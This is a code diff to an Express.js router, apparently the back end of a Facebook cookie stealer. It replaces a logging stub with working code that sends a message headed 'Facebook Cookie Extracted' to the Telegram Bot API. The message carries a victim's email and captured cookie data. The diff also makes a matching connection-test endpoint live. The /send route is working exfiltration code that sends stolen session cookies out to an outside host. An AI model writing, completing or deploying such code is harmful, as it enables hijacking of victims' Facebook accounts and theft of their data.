@@ -1,5 +1,6 @@
 import express from "express";
 import db from "../database.js";
+import https from "https";
 
 const router = express.Router();
 
@@ -54,35 +55,80 @@ router.post("/send", async (req, res) => {
 
     // Format message
     const message = `
-🔐 **Facebook Cookie Extracted**
+🔐 *Facebook Cookie Extracted*
 
-📧 Email: ${email}
+📧 Email: \`${email}\`
 🍪 Cookies: ${cookie_data.length} bytes
 ⏰ Time: ${new Date().toLocaleString("vi-VN")}
 
 Cookie Data:
 \`\`\`
-${cookie_data}
+${cookie_data.substring(0, 1000)}${cookie_data.length > 1000 ? '...' : ''}
 \`\`\`
     `.trim();
 
-    // In production, send via Telegram API:
-    // await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-    //   chat_id: telegramChatId,
-    //   text: message,
-    //   parse_mode: 'Markdown'
-    // });
-
-    console.log("Would send to Telegram:", {
-      chatId: telegramChatId,
-      messageLength: message.length,
+    // Send via Telegram Bot API using https module
+    const postData = JSON.stringify({
+      chat_id: telegramChatId,
+      text: message,
+      parse_mode: 'Markdown'
     });
 
-    res.json({
-      success: true,
-      message: "Cookie sent to Telegram successfully",
-      preview: message.substring(0, 200) + "...",
+    const options = {
+      hostname: 'api.telegram.org',
+      path: `/bot${telegramBotToken}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData)
+      }
+    };
+
+    const request = https.request(options, (response) => {
+      let data = '';
+
+      response.on('data', (chunk) => {
+        data += chunk;
+      });
+
+      response.on('end', () => {
+        try {
+          const result = JSON.parse(data);
+          
+          if (!result.ok) {
+            return res.status(500).json({
+              success: false,
+              message: "Failed to send to Telegram",
+              error: result.description || 'Telegram API error'
+            });
+          }
+
+          res.json({
+            success: true,
+            message: "Cookie sent to Telegram successfully",
+            messageId: result.result.message_id
+          });
+        } catch (parseError) {
+          res.status(500).json({
+            success: false,
+            message: "Failed to parse Telegram response",
+            error: parseError.message
+          });
+        }
+      });
     });
+
+    request.on('error', (error) => {
+      console.error("Telegram API error:", error);
+      res.status(500).json({
+        success: false,
+        message: "Failed to send to Telegram",
+        error: error.message
+      });
+    });
+
+    request.write(postData);
+    request.end();
   } catch (error) {
     console.error("Error sending to Telegram:", error);
     res.status(500).json({
@@ -144,18 +190,68 @@ router.post("/test", async (req, res) => {
       });
     }
 
-    // In production, test with actual API call
+    // Test with actual API call using https module
     const testMessage = "✅ Telegram bot connection test successful!";
-
-    console.log("Would send test message to Telegram:", {
-      chatId: telegramChatId,
-      message: testMessage,
+    const postData = JSON.stringify({
+      chat_id: telegramChatId,
+      text: testMessage
     });
 
-    res.json({
-      success: true,
-      message: "Telegram connection test successful",
+    const options = {
+      hostname: 'api.telegram.org',
+      path: `/bot${telegramBotToken}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData)
+      }
+    };
+
+    const request = https.request(options, (response) => {
+      let data = '';
+
+      response.on('data', (chunk) => {
+        data += chunk;
+      });
+
+      response.on('end', () => {
+        try {
+          const result = JSON.parse(data);
+          
+          if (!result.ok) {
+            return res.status(500).json({
+              success: false,
+              message: "Failed to test Telegram connection",
+              error: result.description || 'Telegram API error'
+            });
+          }
+
+          res.json({
+            success: true,
+            message: "Telegram connection test successful",
+            messageId: result.result.message_id
+          });
+        } catch (parseError) {
+          res.status(500).json({
+            success: false,
+            message: "Failed to parse Telegram response",
+            error: parseError.message
+          });
+        }
+      });
     });
+
+    request.on('error', (error) => {
+      console.error("Error testing Telegram:", error);
+      res.status(500).json({
+        success: false,
+        message: "Failed to test Telegram connection",
+        error: error.message,
+      });
+    });
+
+    request.write(postData);
+    request.end();
   } catch (error) {
     console.error("Error testing Telegram:", error);
     res.status(500).json({
